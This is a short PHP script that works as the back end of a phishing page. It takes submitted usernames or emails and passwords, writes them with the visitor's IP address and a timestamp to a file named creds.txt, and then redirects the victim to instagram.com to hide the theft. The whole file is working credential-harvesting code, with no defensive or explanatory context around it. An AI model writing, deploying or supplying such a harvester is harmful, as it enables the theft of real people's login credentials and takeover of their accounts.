<?php
date_default_timezone_set('UTC');
$logfile = 'creds.txt';

$ip = $_SERVER['REMOTE_ADDR'];
$time = date("Y-m-d H:i:s");
$user = $_POST['user'] ?? $_POST['email'] ?? 'N/A';
$pass = $_POST['pass'] ?? $_POST['password'] ?? 'N/A';

$log = "[$time] IP: $ip | USER: $user | PASS: $pass\n";

file_put_contents($logfile, $log, FILE_APPEND | LOCK_EX);

// Optional redirect after logging
header("Location: https://instagram.com");
exit();
?>
